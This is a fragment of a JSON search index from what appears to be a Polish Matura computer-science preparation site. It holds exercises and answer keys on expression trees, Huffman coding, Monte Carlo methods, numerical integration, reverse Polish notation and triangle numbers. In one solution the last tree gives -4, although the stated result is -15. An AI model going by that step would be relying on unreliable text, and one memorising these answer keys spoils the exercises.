n1[\"10\"]\n    op2 --&gt; op3[\"\\+\"]\n    op3 --&gt; op4[\"/\"]\n    op3 --&gt; n2[\"8\"]\n    op4 --&gt; n3[\"15\"]\n    op4 --&gt; n4[\"5\"]\n    op1 --&gt; n5[\"3\"] </code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/#zadanie-3","title":"Zadanie 3","text":"<p>Przedstaw poni\u017csze wyra\u017cenie arytmetyczne w postaci drzewa wyra\u017ce\u0144 arytmetycznych.</p> <p>\\(4 + (9 - 3) * (6 / 2)\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/#drzewo-1","title":"Drzewo 1","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op1 --&gt; op3[\"/\"]\n    op3 --&gt; n1[\"5\"]\n    op3 --&gt; n2[\"1\"]\n    op2 --&gt; op4[\"\\+\"]\n    op4 --&gt; n3[\"2\"]\n    op4 --&gt; n4[\"3\"]\n    op2 --&gt; n5[\"4\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/#drzewo-2","title":"Drzewo 2","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1 --&gt; op3[\"5\"]\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op2 --&gt; op4[\"\\+\"]\n    op4 --&gt; n3[\"2\"]\n    op4 --&gt; n4[\"3\"]\n    op2 --&gt; n5[\"4\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/#drzewo-3","title":"Drzewo 3","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1 --&gt; op3[\"5\"]\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op2 --&gt; op4[\"5\"]\n    op2 --&gt; n5[\"4\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/#drzewo-4","title":"Drzewo 4","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1 --&gt; op3[\"5\"]\n    op1[\"\\-\"] --&gt; op2[\"20\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/#drzewo-4_1","title":"Drzewo 4","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"-4\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-1/#wynik","title":"Wynik","text":"<p>\\((5 / 1) - (2 + 3) * 4 =-15\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/#drzewo-1","title":"Drzewo 1","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op2 --&gt; n1[\"10\"]\n    op2 --&gt; op3[\"\\+\"]\n    op3 --&gt; op4[\"/\"]\n    op3 --&gt; n2[\"8\"]\n    op4 --&gt; n3[\"15\"]\n    op4 --&gt; n4[\"5\"]\n    op1 --&gt; n5[\"3\"] </code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/#drzewo-2","title":"Drzewo 2","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op2 --&gt; n1[\"10\"]\n    op2 --&gt; op3[\"\\+\"]\n    op3 --&gt; op4[\"3\"]\n    op3 --&gt; n2[\"8\"]\n    op1 --&gt; n5[\"3\"] </code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/#drzewo-3","title":"Drzewo 3","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op2 --&gt; n1[\"10\"]\n    op2 --&gt; op3[\"11\"]\n    op1 --&gt; n5[\"3\"] </code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/#drzewo-4","title":"Drzewo 4","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"110\"]\n    op1 --&gt; n5[\"3\"] </code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/#drzewo-4_1","title":"Drzewo 4","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"107\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-2/#wynik","title":"Wynik","text":"<p>\\(10 * ((15 / 5) + 8) - 3 = 107\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-3/","title":"Zadanie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/solution-3/#drzewo","title":"Drzewo","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\+\"] --&gt; n1[\"4\"]\n    op1 --&gt; op2[\"\\*\"]\n    op2 --&gt; op3[\"\\-\"]\n    op3 --&gt; n2[\"9\"]\n    op3 --&gt; n4[\"3\"]\n    op2 --&gt; op4[\"/\"]\n    op4 --&gt; n5[\"6\"]\n    op4 --&gt; n6[\"2\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/","title":"Kody Huffmana","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/#opis-algorytmu","title":"Opis algorytmu","text":"<p>huffman-coding.md</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/#zadanie-1","title":"Zadanie 1","text":"<p>Dany jest nast\u0119puj\u0105cy tekst w j\u0119zyku angielskim, zapisany poni\u017cej. Zgodnie z algorytmem kodowania Huffmana stw\u00f3rz i rozrysuj drzewo kod\u00f3w, a nast\u0119pnie zakoduj podany tekst za jego pomoc\u0105. Oblicz uzyskany stopie\u0144 kompresji z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku, zak\u0142adaj\u0105c, \u017ce oryginalny tekst by\u0142 zakodowany za pomoc\u0105 standardowego kodu ASCII, gdzie ka\u017cdy znak to jeden bajt.</p> <p>Pami\u0119taj: mo\u017cliwe jest uzyskanie kilku r\u00f3\u017cnych, prawid\u0142owych drzew kod\u00f3w.</p> <p>knowledge_is_power</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/#zadanie-2","title":"Zadanie 2","text":"<p>Poni\u017cej podane jest drzewo kod\u00f3w Huffmana, a nast\u0119pnie zakodowana wiadomo\u015b\u0107. Odkoduj wiadomo\u015b\u0107 na podstawie drzewa, a tak\u017ce oblicz stopie\u0144 kompresji z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku, przyjmuj\u0105c jeden bajt na ka\u017cdy znak w oryginalnym tek\u015bcie.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/#drzewo-kodow","title":"Drzewo kod\u00f3w","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    n19((20)) --0--&gt; n17((8))\n    n19((20)) --1--&gt; n18((12))\n    n18((12)) --0--&gt; n15((5))\n    n18((12)) --1--&gt; n16((7))\n    n16((7)) --0--&gt; n7((\"3|l\"))\n    n16((7)) --1--&gt; n9((\"4|e\"))\n    n15((5)) --0--&gt; n12((2))\n    n15((5)) --1--&gt; n4((\"3|_\"))\n    n12((2)) --0--&gt; n6((\"1|i\"))\n    n12((2)) --1--&gt; n8((\"1|t\"))\n    n17((8)) --0--&gt; n13((4))\n    n17((8)) --1--&gt; n14((4))\n    n14((4)) --0--&gt; n5((\"2|h\"))\n    n14((4)) --1--&gt; n11((2))\n    n11((2)) --0--&gt; n0((\"1|r\"))\n    n11((2)) --1--&gt; n3((\"1|s\"))\n    n13((4)) --0--&gt; n1((\"2|p\"))\n    n13((4)) --1--&gt; n2((\"2|o\"))</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/#wiadomosc","title":"Wiadomo\u015b\u0107","text":"<pre><code>0101111101101011000011110100110010101110110101000111001000110111\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-1/#drzewo-kodow","title":"Drzewo kod\u00f3w","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    n25((18)) --0--&gt; n23((8))\n    n25((18)) --1--&gt; n24((10))\n    n24((10)) --0--&gt; n21((4))\n    n24((10)) --1--&gt; n22((6))\n    n22((6)) --0--&gt; n2((\"3|e\"))\n    n22((6)) --1--&gt; n18((3))\n    n18((3)) --0--&gt; n10((\"1|i\"))\n    n18((3)) --1--&gt; n9((\"2|o\"))\n    n21((4)) --0--&gt; n16((2))\n    n21((4)) --1--&gt; n17((2))\n    n17((2)) --0--&gt; n7((\"1|d\"))\n    n17((2)) --1--&gt; n8((\"1|r\"))\n    n16((2)) --0--&gt; n5((\"1|l\"))\n    n16((2)) --1--&gt; n6((\"1|g\"))\n    n23((8)) --0--&gt; n19((4))\n    n23((8)) --1--&gt; n20((4))\n    n20((4)) --0--&gt; n14((2))\n    n20((4)) --1--&gt; n15((2))\n    n15((2)) --0--&gt; n3((\"1|n\"))\n    n15((2)) --1--&gt; n4((\"1|p\"))\n    n14((2)) --0--&gt; n0((\"1|s\"))\n    n14((2)) --1--&gt; n1((\"1|k\"))\n    n19((4)) --0--&gt; n11((\"2|_\"))\n    n19((4)) --1--&gt; n12((\"2|w\"))</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-1/#tabela-kodow","title":"Tabela kod\u00f3w","text":"znak kod _ 000 d 1010 e 110 g 1001 i 1110 k 0101 l 1000 n 0110 o 1111 p 0111 r 1011 s 0100 w 001"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-1/#zakodowany-tekst","title":"Zakodowany tekst","text":"<pre><code>01010110111100110001101010100111000011100100000011111110011101011\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-1/#stopien-kompresji","title":"Stopie\u0144 kompresji","text":"<p>\\(45.14\\%\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-2/#tekst","title":"Tekst","text":"<p>hell_is_other_people</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-2/#stopien-kompresji","title":"Stopie\u0144 kompresji","text":"<p>\\(40.00\\%\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/huffman-coding/solution-2/#tabela-kodow","title":"Tabela kod\u00f3w","text":"znak kod _ 101 e 111 h 010 i 1000 l 110 o 001 p 000 r 0110 s 0111 t 1001"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/monte-carlo/","title":"Metoda Monte Carlo","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/monte-carlo/#opis-algorytmu","title":"Opis algorytmu","text":"<p>monte-carlo.md</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/monte-carlo/#zadanie-1","title":"Zadanie 1","text":"<p>Wykorzystaj metod\u0119 Monte Carlo w celu oszacowania warto\u015bci liczby \\(\\pi\\). Korzystaj\u0105c z arkusza kalkulacyjnego przygotuj symulacj\u0119 wynik\u00f3w algorytmu dla nast\u0119puj\u0105cej liczby wylosowanych punkt\u00f3w:</p> <ul> <li>\\(10\\)</li> <li>\\(10^2\\)</li> <li>\\(10^3\\)</li> <li>\\(10^4\\)</li> <li>\\(10^5\\)</li> <li>\\(10^6\\)</li> </ul> <p>Przedstaw na wykresie jak zmienia si\u0119 dok\u0142adno\u015b\u0107 oszacowania warto\u015bci \\(\\pi\\) w zale\u017cno\u015bci od liczby wylosowanych punkt\u00f3w. Dok\u0142adno\u015b\u0107 przedstaw jako od\u0142eg\u0142o\u015b\u0107 uzyskanego wyniku od warto\u015bci liczby \\(\\pi\\) z arkusza kalkulacyjnego, czyli jako warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy pomi\u0119dzy tymi warto\u015bciami.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/monte-carlo/#zadanie-2","title":"Zadanie 2","text":"<p>W celu poprawienia wynik\u00f3w uzyskanych w zadaniu 1, uzupe\u0142nij symulacj\u0119 o trzy dodatkowe przebiegi algorytmu. Oszacowana warto\u015b\u0107 liczby \\(\\pi\\) powinna by\u0107 policzona jako \u015brednia wynik\u00f3w ze wszystkich czterech przebieg\u00f3w algorytmu. Ponownie poka\u017c zmian\u0119 dok\u0142adno\u015bci na wykresie.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/numerical-integration/","title":"Ca\u0142kowanie numeryczne","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/numerical-integration/#opisy-algorytmow","title":"Opisy algorytm\u00f3w","text":"<p>numerical-integration.md</p> <p>monte-carlo.md</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/numerical-integration/#zadanie-1","title":"Zadanie 1","text":"<p>Dana jest nast\u0119puj\u0105ca funkcja:</p> \\[ f(x) = \\sin{(\\cos{(x)})} \\] <p>Oszacuj warto\u015b\u0107 ca\u0142ki podanej funkcji na przedziale \\([0, 3]\\), tzn.:</p> \\[ \\int_{0}^{3} \\sin{(\\cos{(x)})} \\ dx \\] <p>Mo\u017cesz za\u0142o\u017cy\u0107, \u017ce:</p> \\[ \\int_{0}^{3} \\sin{(\\cos{(x)})} \\ dx \\simeq 0.118889545631 \\] <p>Wykorzystaj metod\u0119 prostok\u0105t\u00f3w w celu oszacowania warto\u015bci ca\u0142ki. Korzystaj\u0105c z arkusza kalkulacyjnego przygotuj symulacj\u0119 wynik\u00f3w algorytmu dla nast\u0119puj\u0105cej liczby przedzia\u0142\u00f3w:</p> <ul> <li>\\(10\\)</li> <li>\\(10^2\\)</li> <li>\\(10^3\\)</li> <li>\\(10^4\\)</li> <li>\\(10^5\\)</li> <li>\\(10^6\\)</li> </ul> <p>Przedstaw na wykresie jak zmienia si\u0119 dok\u0142adno\u015b\u0107 oszacowania warto\u015bci ca\u0142ki w zale\u017cno\u015bci od liczby wylosowanych punkt\u00f3w. Dok\u0142adno\u015b\u0107 przedstaw jako od\u0142eg\u0142o\u015b\u0107 uzyskanego wyniku od oczekiwanej warto\u015bci ca\u0142ki podanej wcze\u015bniej, czyli jako warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy pomi\u0119dzy tymi warto\u015bciami.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/numerical-integration/#zadanie-2","title":"Zadanie 2","text":"<p>Wykorzystaj metod\u0119 trapez\u00f3w w celu oszacowania warto\u015bci ca\u0142ki. Korzystaj\u0105c z arkusza kalkulacyjnego przygotuj symulacj\u0119 wynik\u00f3w algorytmu dla nast\u0119puj\u0105cej liczby przedzia\u0142\u00f3w:</p> <ul> <li>\\(10\\)</li> <li>\\(10^2\\)</li> <li>\\(10^3\\)</li> <li>\\(10^4\\)</li> <li>\\(10^5\\)</li> <li>\\(10^6\\)</li> </ul> <p>Przedstaw na wykresie jak zmienia si\u0119 dok\u0142adno\u015b\u0107 oszacowania warto\u015bci ca\u0142ki w zale\u017cno\u015bci od liczby wylosowanych punkt\u00f3w. Dok\u0142adno\u015b\u0107 przedstaw jako od\u0142eg\u0142o\u015b\u0107 uzyskanego wyniku od oczekiwanej warto\u015bci ca\u0142ki podanej wcze\u015bniej, czyli jako warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy pomi\u0119dzy tymi warto\u015bciami.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/numerical-integration/#zadanie-3","title":"Zadanie 3","text":"<p>Wykorzystaj metod\u0119 Monte Carlo w celu oszacowania warto\u015bci ca\u0142ki. Korzystaj\u0105c z arkusza kalkulacyjnego przygotuj symulacj\u0119 wynik\u00f3w algorytmu dla nast\u0119puj\u0105cej liczby wylosowanych punkt\u00f3w:</p> <ul> <li>\\(10\\)</li> <li>\\(10^2\\)</li> <li>\\(10^3\\)</li> <li>\\(10^4\\)</li> <li>\\(10^5\\)</li> <li>\\(10^6\\)</li> </ul> <p>Przedstaw na wykresie jak zmienia si\u0119 dok\u0142adno\u015b\u0107 oszacowania warto\u015bci ca\u0142ki w zale\u017cno\u015bci od liczby wylosowanych punkt\u00f3w. Dok\u0142adno\u015b\u0107 przedstaw jako od\u0142eg\u0142o\u015b\u0107 uzyskanego wyniku od oczekiwanej warto\u015bci ca\u0142ki podanej wcze\u015bniej, czyli jako warto\u015b\u0107 bezwzgl\u0119dn\u0105 r\u00f3\u017cnicy pomi\u0119dzy tymi warto\u015bciami.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/numerical-integration/#zadanie-4","title":"Zadanie 4","text":"<p>Utw\u00f3rz wykres przedstawiaj\u0105cy por\u00f3wnanie dok\u0142adno\u015bci wynik\u00f3w z zada\u0144 \\(1\\), \\(2\\) i \\(3\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/","title":"Odwrotna notacja polska","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/#opis-algorytmu","title":"Opis algorytmu","text":"<p>rpn.md</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/#zadanie-1","title":"Zadanie 1","text":"<p>Oblicz warto\u015b\u0107 poni\u017cszego wyra\u017cenia zapisanego w ONP. Zapisz, jak zmienia si\u0119 stos w kolejnych krokach.</p> <pre><code>2 3 + 4 * 5 - 2 3 + * 4 -\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/#zadanie-2","title":"Zadanie 2","text":"<p>Oblicz warto\u015b\u0107 poni\u017cszego wyra\u017cenia zapisanego w ONP. Zapisz, jak zmienia si\u0119 stos w kolejnych krokach.</p> <pre><code>7 6 2 * 5 + 1 / -\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-1","title":"Stos 1","text":"<pre><code> flowchart TD\n    e1[\"2\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-2","title":"Stos 2","text":"<pre><code> flowchart TD\n    e1[\"3\"]\n    e2[\"2\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-3","title":"Stos 3","text":"<pre><code> flowchart TD\n    e1[\"5\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-4","title":"Stos 4","text":"<pre><code> flowchart TD\n    e1[\"4\"]\n    e2[\"5\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-5","title":"Stos 5","text":"<pre><code> flowchart TD\n    e1[\"20\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-6","title":"Stos 6","text":"<pre><code> flowchart TD\n    e1[\"5\"]\n    e2[\"20\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-7","title":"Stos 7","text":"<pre><code> flowchart TD\n    e1[\"15\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-8","title":"Stos 8","text":"<pre><code> flowchart TD\n    e1[\"2\"]\n    e2[\"15\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-9","title":"Stos 9","text":"<pre><code> flowchart TD\n    e1[\"3\"]\n    e2[\"2\"]\n    e3[\"15\"]\n    e1 --&gt; e2\n    e2 --&gt; e3</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-10","title":"Stos 10","text":"<pre><code> flowchart TD\n    e1[\"5\"]\n    e2[\"15\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-11","title":"Stos 11","text":"<pre><code> flowchart TD\n    e1[\"75\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-12","title":"Stos 12","text":"<pre><code> flowchart TD\n    e1[\"4\"]\n    e2[\"75\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#stos-13","title":"Stos 13","text":"<pre><code> flowchart TD\n    e1[\"71\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-1/#wynik","title":"Wynik","text":"<p>\\(71\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/","title":"Rozwi\u0105zanie 1","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-1","title":"Stos 1","text":"<pre><code> flowchart TD\n    e1[\"7\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-2","title":"Stos 2","text":"<pre><code> flowchart TD\n    e1[\"6\"]\n    e2[\"7\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-3","title":"Stos 3","text":"<pre><code> flowchart TD\n    e1[\"2\"]\n    e2[\"6\"]\n    e3[\"7\"]\n    e1 --&gt; e2\n    e2 --&gt; e3</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-4","title":"Stos 4","text":"<pre><code> flowchart TD\n    e1[\"12\"]\n    e2[\"7\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-5","title":"Stos 5","text":"<pre><code> flowchart TD\n    e1[\"5\"]\n    e2[\"12\"]\n    e3[\"7\"]\n    e1 --&gt; e2\n    e2 --&gt; e3</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-6","title":"Stos 6","text":"<pre><code> flowchart TD\n    e1[\"17\"]\n    e2[\"7\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-7","title":"Stos 7","text":"<pre><code> flowchart TD\n    e1[\"1\"]\n    e2[\"17\"]\n    e3[\"7\"]\n    e1 --&gt; e2\n    e2 --&gt; e3</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-8","title":"Stos 8","text":"<pre><code> flowchart TD\n    e1[\"17\"]\n    e2[\"7\"]\n    e1 --&gt; e2</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#stos-9","title":"Stos 9","text":"<pre><code> flowchart TD\n    e1[\"-10\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/rpn/solution-2/#wynik","title":"Wynik","text":"<p>\\(-10\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/","title":"Liczby tr\u00f3jk\u0105tne","text":"<p>Liczby tr\u00f3jk\u0105tne to liczby naturalne, kt\u00f3re mo\u017cna zapisa\u0107 w postaci sumy kolejnych liczb naturalnych od \\(1\\) do \\(n\\). Przyk\u0142adami liczb tr\u00f3jk\u0105tnych s\u0105: \\(1\\), \\(3\\) (\\(1+2\\)), \\(6\\) (\\(1+2+3\\)).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/#zadanie-1","title":"Zadanie 1","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119 okre\u015blaj\u0105c, czy podana liczba \\(k\\) jest liczb\u0105 tr\u00f3jk\u0105tn\u0105, a je\u017celi tak, to dla jakiego \\(n\\) spe\u0142nione jest r\u00f3wnanie \\(k=1+2+...+n\\).</p> \\(k\\) \\(k\\) jest liczb\u0105 tr\u00f3jk\u0105tn\u0105 \\(n\\) 6 TAK 3 8 NIE - 18 28 56 465"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/#zadanie-2","title":"Zadanie 2","text":"<p>Zaprojektuj algorytm sprawdzaj\u0105cy, dla zadanej liczby naturalnej \\(k\\), czy jest ona liczb\u0105 tr\u00f3jk\u0105tn\u0105.</p> <p>Twoje rozwi\u0105zanie powinno dzia\u0142a\u0107 w czasie logarytmicznym.</p> <p>Uwaga: w swoim zapisie mo\u017cesz korzysta\u0107 jedynie z podstawowych operacji arytmetycznych (dodawanie, odejmowanie, mno\u017cenie, dzielenie, reszta z dzielenia, dzielenie ca\u0142kowite), instrukcji kontroli przep\u0142ywu (instrukcja warunkowa, p\u0119tla warunkowa, p\u0119tla licz\u0105ca), instrukcji dotycz\u0105cych podstawowych operacji na zmiennych (utworzenie zmiennej, przypisanie warto\u015bci, odczytanie warto\u015bci), instrukcji dotycz\u0105cych podstawowych operacji na tablicach (utworzenie tablicy o zadanym rozmiarze wype\u0142nionej jedn\u0105 warto\u015bci\u0105, odwo\u0142anie do elementu tablicy pod zadanym indeksem) oraz samodzielnie zdefiniowanych funkcji.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/#zadanie-3","title":"Zadanie 3","text":"<p>W pliku trojkatne.txt podanych jest \\(100\\) liczb naturalnych, ka\u017cda w osobnej linii.</p> <p> trojkatne.txt</p> <p>W pliku trojkatne_przyklad.txt podanych jest \\(10\\) liczb naturalnych, ka\u017cda w osobnej linii.</p> <p> trojkatne_przyklad.txt</p> <p>Napisz program, kt\u00f3ry znajdzie wszystkie liczby tr\u00f3jk\u0105tne z pliku.</p> <p>Dla pliku trojkatne_przyklad.txt odpowied\u017a to:</p> <pre><code>253\n561\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#zadanie-1","title":"Zadanie 1","text":"\\(k\\) \\(k\\) jest liczb\u0105 tr\u00f3jk\u0105tn\u0105 \\(n\\) 6 TAK 3 8 NIE - 18 NIE - 28 TAK 7 56 NIE - 465 TAK 30"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#zadanie-2","title":"Zadanie 2","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#rozwiazanie-logarytmiczne","title":"Rozwi\u0105zanie logarytmiczne","text":"<pre><code>funkcja czy_trojkatna(k):\n    1. lewy := 1\n    2. prawy := k\n    3. Dop\u00f3ki lewy &lt;= prawy:\n        4. srodek := (lewy + prawy) div 2\n        5. suma := ((1 + srodek) * srodek) / 2\n        6. Je\u017celi suma = k, to:\n            7. Zwr\u00f3\u0107 PRAWDA i zako\u0144cz\n        8. w przeciwnym przypadku, je\u017celi suma &lt; k, to:\n            9. lewy := srodek + 1\n        10. w przeciwnym przypadku:\n            11. prawy := srodek - 1\n    12. Zwr\u00f3\u0107 FA\u0141SZ i zako\u0144cz\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/triangle-numbers/answers/#rozwiazanie-liniowe","title":"Rozwi\u0105zanie liniowe","text":"<pre><code>funkcja czy_trojkatna(k):\n    1. suma := 0\n    2. i := 1\n    3. Dop\u00f3ki suma &lt; k, wykonuj:\n        4. suma := suma + i\n        5. i := i + 1\n    6. Je\u017celi suma = k, to:\n        7. Zwr\u00f3\u0107 PRAWDA i zako\u0144cz\n    8. Zwr\u00f3\u0107 FA\u0141SZ i 